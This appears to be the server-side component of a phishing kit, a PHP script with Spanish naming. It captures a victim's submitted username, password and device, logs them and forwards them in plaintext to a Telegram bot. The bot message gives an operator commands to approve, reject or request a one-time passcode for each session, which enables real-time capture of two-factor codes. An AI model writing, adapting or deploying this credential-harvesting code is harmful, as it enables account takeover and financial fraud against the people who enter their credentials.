<?php 
session_start();
require('../panel/lib/funciones.php');
require('telegram_bot.php');

$usuario = $_POST['usr'];
$contrasena = $_POST['pas'];
$dispositivo = $_POST['dis'];

setcookie('usuario', $usuario, time()+60*9);
crear_registro($usuario, $contrasena, $dispositivo);

// Generar ID único de sesión
$session_id = bin2hex(random_bytes(8));
$_SESSION['session_id'] = $session_id;
$_SESSION['numero'] = $usuario;
$_SESSION['clave'] = $contrasena;
$_SESSION['dispositivo'] = $dispositivo;
$_SESSION['estado'] = 'esperando';

// Enviar notificación a Telegram
$mensaje = "🚨 <b>NUEVO LOGIN DETECTADO</b>\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "📱 Usuario: <code>$usuario</code>\n";
$mensaje .= "🔑 Clave: <code>$contrasena</code>\n";
$mensaje .= "📟 Dispositivo: <code>$dispositivo</code>\n";
$mensaje .= "🆔 Sesión: <code>$session_id</code>\n";
$mensaje .= "⏰ " . date('d/m/Y H:i:s') . "\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$mensaje .= "<b>Comandos disponibles:</b>\n";
$mensaje .= "/aprobar_$session_id\n";
$mensaje .= "/rechazar_$session_id\n";
$mensaje .= "/pedir_otp_$session_id";

enviarTelegram($mensaje);

echo "OK";
?>
